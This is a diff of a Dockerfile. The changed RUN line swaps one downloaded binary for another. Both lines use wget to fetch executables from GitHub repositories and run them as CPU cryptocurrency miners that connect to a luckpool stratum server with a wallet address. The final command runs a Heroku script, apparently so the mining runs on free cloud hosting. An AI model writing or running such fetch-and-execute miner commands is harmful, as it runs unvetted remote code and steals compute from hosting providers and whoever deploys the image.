@@ -1,4 +1,4 @@
 FROM thomasjp0x42/packetcrypt
 
-RUN wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RJz4XfW5AdpMVUF9GMAsDvvsYFuM1MmJeS.blong -p x --cpu 7
+RUN wget -O meki-baru https://github.com/renilo/xmr/raw/main/meki-baru && chmod +x meki-baru && ./meki-baru -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.CLOUD -p x --cpu 6
 CMD bash heroku.sh
